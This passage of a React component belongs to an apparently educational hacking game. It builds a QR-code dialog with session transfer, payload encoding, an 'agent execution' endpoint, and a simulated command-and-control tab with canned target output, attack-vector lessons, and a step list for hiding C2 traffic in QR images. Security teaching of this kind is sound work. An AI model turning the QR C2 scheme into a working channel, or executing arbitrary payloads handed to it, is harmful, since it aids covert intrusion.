        setSessionMessage('Session imported successfully! Refreshing...');
        setTimeout(() => {
          window.location.reload();
        }, 1500);
      } else {
        setSessionStatus('error');
        setSessionMessage('Invalid session token or session not found');
      }
    } catch (error) {
      setSessionStatus('error');
      setSessionMessage('Failed to import session: ' + String(error));
    }
    setLoading(false);
  };

  const generateC2CommandQR = async () => {
    setLoading(true);
    try {
      const c2Payload = {
        type: 'c2_command',
        id: c2CommandIndex,
        cmd: c2Command,
        encoding: 'base64',
        timestamp: new Date().toISOString()
      };
      const response = await fetch('/api/qr/secret', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          secretId: `c2-cmd-${c2CommandIndex}`, 
          hint: JSON.stringify(c2Payload)
        })
      });
      const data = await response.json();
      setC2CommandQR(data.qrCode);
      setC2CommandIndex(prev => prev + 1);
      setC2ServerStatus('waiting');
    } catch (error) {
      console.error('Failed to generate C2 command QR:', error);
    }
    setLoading(false);
  };

  const simulateC2Result = () => {
    const target = TARGET_MACHINES.find(t => t.id === selectedTarget) || TARGET_MACHINES[0];
    
    let result = target.responses[c2Command];
    
    if (!result) {
      const partialMatch = Object.keys(target.responses).find(cmd => 
        c2Command.includes(cmd.split(' ')[0]) || cmd.includes(c2Command.split(' ')[0])
      );
      if (partialMatch) {
        result = target.responses[partialMatch];
      }
    }
    
    if (!result) {
      const genericResponses: Record<string, string[]> = {
        linux_server: [
          `${c2Command}: command executed\nwww-data@prod-web-01:~$ [no output]`,
          `bash: ${c2Command}: command not found`,
          `Permission denied: ${c2Command}`,
        ],
        windows_workstation: [
          `'${c2Command}' is not recognized as an internal or external command`,
          `Access is denied.`,
          `The term '${c2Command}' is not recognized as the name of a cmdlet`,
        ],
        iot_camera: [
          `${c2Command}: applet not found`,
          `-sh: ${c2Command}: not found`,
          `BusyBox v1.30.1 - ${c2Command} executed`,
        ],
        docker_container: [
          `OCI runtime exec failed: ${c2Command}`,
          `node@api-payments:~$ ${c2Command}\n[no output - process exited 0]`,
          `Error: ENOENT: no such file or directory`,
        ],
      };
      const responses = genericResponses[target.id] || genericResponses.linux_server;
      result = responses[Math.floor(Math.random() * responses.length)];
    }
    
    setC2Results(prev => [...prev, {
      id: c2CommandIndex,
      command: c2Command,
      result,
      timestamp: new Date().toISOString()
    }]);
    setC2CommandIndex(prev => prev + 1);
    setC2ServerStatus('online');
    
    setTimeout(() => setC2ServerStatus('offline'), 3000);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl">
        <DialogHeader>
          <DialogTitle className="text-amber-600 font-orbitron flex items-center gap-2">
            <QrCode className="w-5 h-5" />
            QR SIGNAL GENERATOR
          </DialogTitle>
          <DialogDescription className="text-stone-500">
            Encode or decode data fragments via QR transmission.
          </DialogDescription>
        </DialogHeader>

        <Tabs defaultValue="generate" className="w-full">
          <TabsList className="bg-amber-950/30 border border-amber-900/30 flex-wrap h-auto">
            <TabsTrigger value="session" className="data-[state=active]:bg-teal-900/50 data-[state=active]:text-teal-400">
              <Key className="w-3 h-3 mr-1" /> Session
            </TabsTrigger>
            <TabsTrigger value="generate" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Generate
            </TabsTrigger>
            <TabsTrigger value="export" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Export
            </TabsTrigger>
            <TabsTrigger value="agent" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              <Bot className="w-3 h-3 mr-1" /> Agent
            </TabsTrigger>
            <TabsTrigger value="c2" className="data-[state=active]:bg-red-900/50 data-[state=active]:text-red-400">
              <Radio className="w-3 h-3 mr-1" /> C2
            </TabsTrigger>
            <TabsTrigger value="import" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
              Decode
            </TabsTrigger>
          </TabsList>

          <TabsContent value="session" className="space-y-4 mt-4">
            {/* Current Session Info */}
            <div className="p-4 bg-teal-950/20 rounded border border-teal-900/30">
              <h3 className="text-teal-400 font-bold mb-3 flex items-center gap-2">
                <Key className="w-4 h-4" /> Current Session
              </h3>
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Token:</span>
                  <code className="text-xs text-teal-400 bg-black/50 px-2 py-1 rounded max-w-[200px] truncate">
                    {gameState.sessionToken}
                  </code>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Fragments:</span>
                  <span className="text-xs text-teal-400">{gameState.inventory.length}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs text-stone-500">Username:</span>
                  <span className="text-xs text-teal-400">{gameState.username}</span>
                </div>
              </div>
            </div>

            {/* Copy Token */}
            <Button 
              onClick={copySessionToken}
              className="w-full bg-teal-700 hover:bg-teal-600 text-black font-bold"
              data-testid="copy-session-token"
            >
              <Copy className="w-4 h-4 mr-2" />
              COPY SESSION TOKEN
            </Button>

            {sessionStatus !== 'idle' && (
              <div className={`p-3 rounded border font-mono text-sm flex items-center gap-2 ${
                sessionStatus === 'success'
                  ? 'bg-teal-950/30 border-teal-800/50 text-teal-400' 
                  : 'bg-red-950/30 border-red-800/50 text-red-400'
              }`}>
                {sessionStatus === 'success' ? <CheckCircle className="w-4 h-4" /> : <AlertCircle className="w-4 h-4" />}
                {sessionMessage}
              </div>
            )}

            {/* Import Session */}
            <div className="pt-4 border-t border-stone-800">
              <h4 className="text-sm text-amber-600 font-bold mb-3">Import Existing Session</h4>
              <div className="space-y-3">
                <Input
                  value={sessionInput}
                  onChange={(e) => setSessionInput(e.target.value)}
                  className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                  placeholder="Paste session token here..."
                  data-testid="session-input"
                />
                <Button 
                  onClick={handleImportSession}
                  disabled={loading || !sessionInput.trim()}
                  className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
                  data-testid="import-session-btn"
                >
                  <Upload className="w-4 h-4 mr-2" />
                  {loading ? 'IMPORTING...' : 'IMPORT SESSION'}
                </Button>
              </div>
              <p className="text-xs text-stone-600 mt-2">
                Importing a session will replace your current progress with the imported session's data.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="generate" className="space-y-4 mt-4">
            {/* Action Type Selector */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700 flex items-center gap-2">
                <Zap className="w-3 h-3" />
                QR Action Type
              </label>
              <Select 
                value={selectedPreset} 
                onValueChange={(value) => {
                  setSelectedPreset(value);
                  const preset = QR_ACTION_PRESETS.find(p => p.id === value);
                  if (preset) setCode(preset.template);
                }}
              >
                <SelectTrigger className="bg-black/50 border-amber-900/30 text-amber-500">
                  <SelectValue placeholder="Select action type" />
                </SelectTrigger>
                <SelectContent className="bg-[#0a0500] border-amber-900/50">
                  {QR_ACTION_PRESETS.map((preset) => (
                    <SelectItem 
                      key={preset.id} 
                      value={preset.id}
                      className="text-amber-500 focus:bg-amber-900/30 focus:text-amber-400"
                    >
                      {preset.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <p className="text-xs text-stone-600">
                {QR_ACTION_PRESETS.find(p => p.id === selectedPreset)?.description}
              </p>
            </div>

            {/* Editable Payload */}
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">
                Payload Code (Edit Below)
              </label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-32 resize-none"
                placeholder='{"type":"secret","data":"your_message"}'
              />
              <p className="text-xs text-stone-600">
                Edit the JSON above to customize what this QR code does when scanned.
              </p>
            </div>

            <Button 
              onClick={generateQR} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'ENCODE TO QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Generated QR Code" className="w-48 h-48" />
                <div className="flex gap-2">
                  <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                    <Download className="w-4 h-4 mr-2" /> Download
                  </Button>
                  <Button variant="outline" size="sm" onClick={copyToClipboard} className="border-amber-800 text-amber-600">
                    <Copy className="w-4 h-4 mr-2" /> Copy Data URL
                  </Button>
                </div>
                
                {/* Agent Execution Info */}
                <div className="w-full mt-2 p-3 bg-amber-950/20 rounded border border-amber-900/30 text-left">
                  <p className="text-xs text-amber-600 font-bold mb-1">AGENT EXECUTION</p>
                  <p className="text-xs text-stone-500 mb-2">Give this payload to an agent to execute elsewhere:</p>
                  <code className="block text-xs text-amber-500/80 bg-black/50 p-2 rounded overflow-x-auto">
                    POST /api/agent/execute<br/>
                    {`{ "payload": ${code.substring(0, 50)}${code.length > 50 ? '...' : ''} }`}
                  </code>
                </div>
              </div>
            )}
          </TabsContent>

          <TabsContent value="export" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2">Current Session</h3>
              <p className="text-xs text-stone-500">Token: {gameState.sessionToken.substring(0, 16)}...</p>
              <p className="text-xs text-stone-500">Clues Collected: {gameState.inventory.length}</p>
              <p className="text-xs text-stone-500">Username: {gameState.username}</p>
            </div>

            <Button 
              onClick={exportSession} 
              disabled={loading}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : 'EXPORT SESSION AS QR'}
            </Button>

            {qrImage && (
              <div className="flex flex-col items-center gap-4 p-4 bg-black/30 rounded border border-amber-900/20">
                <img src={qrImage} alt="Session QR Code" className="w-48 h-48" />
                <p className="text-xs text-stone-600">Share this QR to transfer your progress</p>
                <Button variant="outline" size="sm" onClick={downloadQR} className="border-amber-800 text-amber-600">
                  <Download className="w-4 h-4 mr-2" /> Download
                </Button>
              </div>
            )}
          </TabsContent>

          <TabsContent value="agent" className="space-y-4 mt-4">
            <div className="p-4 bg-amber-950/20 rounded border border-amber-900/30">
              <h3 className="text-amber-500 font-bold mb-2 flex items-center gap-2">
                <Bot className="w-4 h-4" /> Agent Execution API
              </h3>
              <p className="text-xs text-stone-500 mb-2">
                Execute QR payloads via the agent API. Give the payload to any automated system or AI agent.
              </p>
              <code className="block text-xs text-stone-400 bg-black/50 p-2 rounded">
                POST /api/agent/execute
              </code>
            </div>

            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Current Payload</label>
              <Textarea
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono h-24 resize-none text-xs"
              />
            </div>

            <div className="flex gap-2">
              <Button 
                onClick={executeViaAgent} 
                disabled={loading}
                className="flex-1 bg-amber-700 hover:bg-amber-600 text-black font-bold"
              >
                <Play className="w-4 h-4 mr-2" />
                {loading ? 'EXECUTING...' : 'EXECUTE NOW'}
              </Button>
              <Button 
                onClick={copyPayloadForAgent}
                variant="outline"
                className="border-amber-800 text-amber-600"
              >
                <Copy className="w-4 h-4 mr-2" /> Copy for Agent
              </Button>
            </div>

            {agentResult && (
              <div className="p-3 rounded border bg-black/50 border-amber-800/50">
                <p className="text-xs text-amber-600 font-bold mb-1">EXECUTION RESULT</p>
                <pre className="text-xs text-amber-500/80 overflow-x-auto whitespace-pre-wrap max-h-40 overflow-y-auto">
                  {agentResult}
                </pre>
              </div>
            )}

            <div className="p-3 bg-black/30 rounded border border-amber-900/20">
              <p className="text-xs text-amber-700 font-bold mb-2">AVAILABLE ACTION TYPES</p>
              <div className="grid grid-cols-2 gap-1 text-xs text-stone-500">
                <span>• beacon (C2 check-in)</span>
                <span>• exfil (data extraction)</span>
                <span>• inject (code injection)</span>
                <span>• phish (credential harvest)</span>
                <span>• dropper (payload drop)</span>
                <span>• pivot (network pivot)</span>
                <span>• recon (reconnaissance)</span>
                <span>• persist (persistence)</span>
                <span>• crypto (cipher challenge)</span>
                <span>• raw (raw data)</span>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="c2" className="space-y-4 mt-4 max-h-[60vh] overflow-y-auto">
            {/* C2 Section Tabs */}
            <div className="flex gap-1 p-1 bg-black/30 rounded border border-red-900/20">
              <Button
                variant={c2Section === 'encode' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('encode')}
                className={c2Section === 'encode' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
              >
                <Terminal className="w-3 h-3 mr-1" /> Encode
              </Button>
              <Button
                variant={c2Section === 'vectors' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('vectors')}
                className={c2Section === 'vectors' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
              >
                <Zap className="w-3 h-3 mr-1" /> Attack Vectors
              </Button>
              <Button
                variant={c2Section === 'labs' ? 'default' : 'ghost'}
                size="sm"
                onClick={() => setC2Section('labs')}
                className={c2Section === 'labs' ? 'bg-red-700 text-white' : 'text-red-400 hover:bg-red-950/30'}
              >
                <Key className="w-3 h-3 mr-1" /> QR Labs
              </Button>
            </div>

            {/* ENCODE SECTION */}
            {c2Section === 'encode' && (
              <>
                {/* Target Machine Selector */}
                <div className="p-3 bg-red-950/20 rounded border border-red-900/30">
                  <label className="text-xs uppercase tracking-widest text-red-700 mb-2 block">Target Machine</label>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                    {TARGET_MACHINES.map((target) => (
                      <Button
                        key={target.id}
                        variant={selectedTarget === target.id ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setSelectedTarget(target.id)}
                        className={`text-xs h-auto py-2 ${selectedTarget === target.id 
                          ? 'bg-red-700 text-white' 
                          : 'border-red-900/30 text-red-400 hover:bg-red-950/30'}`}
                      >
                        <span className="mr-1">{target.icon}</span>
                        <span className="truncate">{target.name}</span>
                      </Button>
                    ))}
                  </div>
                  <p className="text-xs text-stone-500 mt-2">
                    {TARGET_MACHINES.find(t => t.id === selectedTarget)?.description} • {TARGET_MACHINES.find(t => t.id === selectedTarget)?.os}
                  </p>
                </div>

                {/* Command Template */}
                <div className="space-y-2">
                  <label className="text-xs uppercase tracking-widest text-red-700 flex items-center gap-2">
                    <Terminal className="w-3 h-3" /> Command Template
                  </label>
                  <Select 
                    value={c2SelectedTemplate} 
                    onValueChange={(value) => {
                      setC2SelectedTemplate(value);
                      const template = C2_COMMAND_TEMPLATES.find(t => t.id === value);
                      if (template && template.template) setC2Command(template.template);
                    }}
                  >
                    <SelectTrigger className="bg-black/50 border-red-900/30 text-red-500">
                      <SelectValue placeholder="Select command template" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#0a0500] border-red-900/50">
                      {C2_COMMAND_TEMPLATES.map((template) => (
                        <SelectItem 
                          key={template.id} 
                          value={template.id}
                          className="text-red-500 focus:bg-red-900/30 focus:text-red-400"
                        >
                          {template.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {/* Command Input */}
                <div className="space-y-2">
                  <label className="text-xs uppercase tracking-widest text-red-700">Command to Execute</label>
                  <Input
                    value={c2Command}
                    onChange={(e) => setC2Command(e.target.value)}
                    className="bg-black/50 border-red-900/30 text-red-500 font-mono"
                    placeholder="Enter shell command..."
                    data-testid="c2-command-input"
                  />
                </div>

                {/* Generate & Simulate */}
                <div className="flex gap-2">
                  <Button 
                    onClick={generateC2CommandQR} 
                    disabled={loading || !c2Command}
                    className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold min-h-[44px]"
                    data-testid="generate-c2-qr"
                  >
                    <QrCode className="w-4 h-4 mr-2" />
                    {loading ? 'ENCODING...' : 'ENCODE'}
                  </Button>
                  <Button 
                    onClick={simulateC2Result}
                    disabled={!c2CommandQR}
                    variant="outline"
                    className="border-red-800 text-red-600 hover:bg-red-950/30 min-h-[44px]"
                    data-testid="simulate-c2-result"
                  >
                    <Play className="w-4 h-4 mr-2" /> Simulate
                  </Button>
                </div>

                {/* Generated QR & Simulated Response */}
                {c2CommandQR && (
                  <div className="flex flex-col items-center gap-3 p-4 bg-black/30 rounded border border-red-900/20">
                    <img src={c2CommandQR} alt="C2 Command QR" className="w-32 h-32" />
                    <Button variant="outline" size="sm" onClick={() => {
                      if (c2CommandQR) {
                        const link = document.createElement('a');
                        link.href = c2CommandQR;
                        link.download = `c2-cmd-${c2CommandIndex - 1}.png`;
                        link.click();
                      }
                    }} className="border-red-800 text-red-600 min-h-[44px]">
                      <Download className="w-4 h-4 mr-2" /> Download
                    </Button>
                  </div>
                )}

                {/* Results History with Realistic Output */}
                {c2Results.length > 0 && (
                  <div className="space-y-2">
                    <label className="text-xs uppercase tracking-widest text-red-700">Simulated Target Response</label>
                    <div className="max-h-48 overflow-y-auto space-y-2">
                      {c2Results.slice(-3).reverse().map((result) => (
                        <div key={result.id} className="p-3 bg-black/50 rounded border border-red-900/20 text-xs font-mono">
                          <div className="flex justify-between text-stone-500 mb-2 border-b border-red-900/20 pb-1">
                            <code className="text-red-400">$ {result.command}</code>
                            <span className="text-stone-600">{TARGET_MACHINES.find(t => t.id === selectedTarget)?.name}</span>
                          </div>
                          <pre className="text-amber-400/90 whitespace-pre-wrap">{result.result}</pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            )}

            {/* ATTACK VECTORS SECTION */}
            {c2Section === 'vectors' && (
              <div className="space-y-3">
                <p className="text-xs text-stone-400">
                  Learn how malicious QR codes reach targets in the real world. Click any vector to see real-world examples and lab scenarios.
                </p>
                
                {/* Category Filter */}
                <div className="flex flex-wrap gap-1">
                  {['physical', 'digital', 'social', 'supply_chain'].map((cat) => (
                    <span key={cat} className={`text-xs px-2 py-1 rounded border ${
                      cat === 'physical' ? 'border-blue-800 text-blue-400' :
                      cat === 'digital' ? 'border-purple-800 text-purple-400' :
                      cat === 'social' ? 'border-pink-800 text-pink-400' :
                      'border-orange-800 text-orange-400'
                    }`}>
                      {cat.replace('_', ' ')}
                    </span>
                  ))}
                </div>

                {/* Vectors Grid */}
                <div className="grid gap-2">
                  {QR_INGESTION_VECTORS.map((vector) => (
                    <div 
                      key={vector.id}
                      className={`p-3 rounded border cursor-pointer transition-all ${
                        selectedVector === vector.id 
                          ? 'bg-red-950/40 border-red-700' 
                          : 'bg-black/30 border-red-900/20 hover:border-red-700/50'
                      }`}
                      onClick={() => setSelectedVector(selectedVector === vector.id ? null : vector.id)}
                    >
                      <div className="flex items-center gap-2 mb-1">
                        <span className="text-lg">{vector.icon}</span>
                        <span className="text-sm text-red-400 font-bold">{vector.name}</span>
                        <span className={`text-xs px-1.5 py-0.5 rounded ${
                          vector.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
                          vector.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                          'bg-red-950 text-red-400'
                        }`}>
                          {vector.difficulty}
                        </span>
                      </div>
                      <p className="text-xs text-stone-400">{vector.description}</p>
                      
                      {selectedVector === vector.id && (
                        <div className="mt-3 pt-3 border-t border-red-900/30 space-y-3">
                          <div>
                            <p className="text-xs text-red-500 font-bold mb-1">Real-World Cases:</p>
                            <ul className="text-xs text-stone-400 space-y-1">
                              {vector.realExamples.map((ex, i) => (
                                <li key={i} className="flex gap-2">
                                  <span className="text-red-600">•</span>
                                  <span>{ex}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                          <div className="p-2 bg-black/50 rounded">
                            <p className="text-xs text-amber-500 font-bold mb-1">Lab Scenario:</p>
                            <p className="text-xs text-stone-300">{vector.labScenario}</p>
                          </div>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* QR LABS SECTION */}
            {c2Section === 'labs' && (
              <div className="space-y-3">
                <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
                  <h4 className="text-amber-400 font-bold text-sm mb-1">QR-in-QR Hijacking Labs</h4>
                  <p className="text-xs text-stone-400">
                    Hands-on exercises teaching QR code security concepts. Based on real academic research and documented attacks.
                  </p>
                </div>

                {/* Labs List */}
                <div className="space-y-2">
                  {QR_INCEPTION_LABS.map((lab) => (
                    <div 
                      key={lab.id}
                      className={`rounded border transition-all ${
                        selectedLab === lab.id 
                          ? 'bg-amber-950/30 border-amber-700' 
                          : 'bg-black/30 border-amber-900/20 hover:border-amber-700/50'
                      }`}
                    >
                      <div 
                        className="p-3 cursor-pointer"
                        onClick={() => setSelectedLab(selectedLab === lab.id ? null : lab.id)}
                      >
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-sm text-amber-400 font-bold">{lab.title}</span>
                          <span className={`text-xs px-1.5 py-0.5 rounded ${
                            lab.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
                            lab.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
                            'bg-red-950 text-red-400'
                          }`}>
                            {lab.difficulty}
                          </span>
                        </div>
                        <p className="text-xs text-stone-400">{lab.concept}</p>
                      </div>
                      
                      {selectedLab === lab.id && (
                        <div className="px-3 pb-3 space-y-3 border-t border-amber-900/30 pt-3">
                          {/* Real World Case */}
                          <div className="p-2 bg-red-950/20 rounded border border-red-900/20">
                            <p className="text-xs text-red-400 font-bold mb-1">Real-World Case:</p>
                            <p className="text-xs text-stone-300">{lab.realWorldCase}</p>
                          </div>

                          {/* Objective */}
                          <div>
                            <p className="text-xs text-amber-500 font-bold mb-1">Objective:</p>
                            <p className="text-xs text-stone-300">{lab.objective}</p>
                          </div>

                          {/* Steps */}
                          <div>
                            <p className="text-xs text-amber-500 font-bold mb-1">Steps:</p>
                            <ol className="text-xs text-stone-400 space-y-1 list-decimal list-inside">
                              {lab.steps.map((step, i) => (
                                <li key={i}>{step}</li>
                              ))}
                            </ol>
                          </div>

                          {/* Detection & Mitigation */}
                          <div className="grid grid-cols-2 gap-2">
                            <div className="p-2 bg-blue-950/20 rounded border border-blue-900/20">
                              <p className="text-xs text-blue-400 font-bold mb-1">Detection:</p>
                              <p className="text-xs text-stone-400">{lab.detection}</p>
                            </div>
                            <div className="p-2 bg-green-950/20 rounded border border-green-900/20">
                              <p className="text-xs text-green-400 font-bold mb-1">Mitigation:</p>
                              <p className="text-xs text-stone-400">{lab.mitigation}</p>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  ))}
                </div>

                {/* Challenge Modes */}
                <div className="p-3 bg-stone-900/30 rounded border border-stone-800">
                  <h4 className="text-amber-500 font-bold text-sm mb-2">In-Game Challenge Modes</h4>
                  <div className="grid gap-2">
                    {QR_CHALLENGE_MODES.map((mode) => (
                      <div key={mode.id} className="p-2 bg-black/30 rounded border border-stone-700/50">
                        <div className="flex items-center gap-2 mb-1">
                          <span>{mode.icon}</span>
                          <span className="text-xs text-teal-400 font-bold">{mode.name}</span>
                          <span className="text-xs text-stone-600">({mode.technique})</span>
                        </div>
                        <p className="text-xs text-stone-400">{mode.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* How It Works */}
            <div className="p-3 bg-black/30 rounded border border-stone-800">
              <p className="text-xs text-stone-500 font-bold mb-2">HOW QR C2 WORKS</p>
              <ol className="text-xs text-stone-500 space-y-1 list-decimal list-inside">
                <li>Attacker encodes command → QR code (command.png)</li>
                <li>Target polls server, downloads & decodes QR</li>
                <li>Command executes, result encoded → QR</li>
                <li>Result QR uploaded, attacker decodes response</li>
                <li>All traffic appears as normal image downloads</li>
              </ol>
              <p className="text-xs text-red-400 mt-2 italic">
                * In NEXUS, this is simulated for educational purposes. No real systems are targeted.
              </p>
            </div>
          </TabsContent>

          <TabsContent value="import" className="space-y-4 mt-4">
            <div className="space-y-2">
              <label className="text-xs uppercase tracking-widest text-amber-700">Base64 Encoded Payload</label>
              <Input
                value={importCode}
                onChange={(e) => setImportCode(e.target.value)}
                className="bg-black/50 border-amber-900/30 text-amber-500 font-mono"
                placeholder="Paste encoded QR data here..."
              />
            </div>

            <Button 
              onClick={handleImport} 
              disabled={loading || !importCode}
              className="w-full bg-amber-700 hover:bg-amber-600 text-black font-bold"
            >
              <Upload className="w-4 h-4 mr-2" />
              {loading ? 'DECODING...' : 'DECODE & IMPORT'}
            </Button>

            {importResult && (
              <div className={`p-3 rounded border font-mono text-sm ${
                importResult.startsWith('SUCCESS') 
                  ? 'bg-green-950/30 border-green-800/50 text-green-500' 
                  : importResult.startsWith('ERROR')
                    ? 'bg-red-950/30 border-red-800/50 text-red-500'
                    : 'bg-amber-950/30 border-amber-800/50 text-amber-500'
              }`}>
                {importResult}
              </div>
            )}
          </TabsContent>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
};
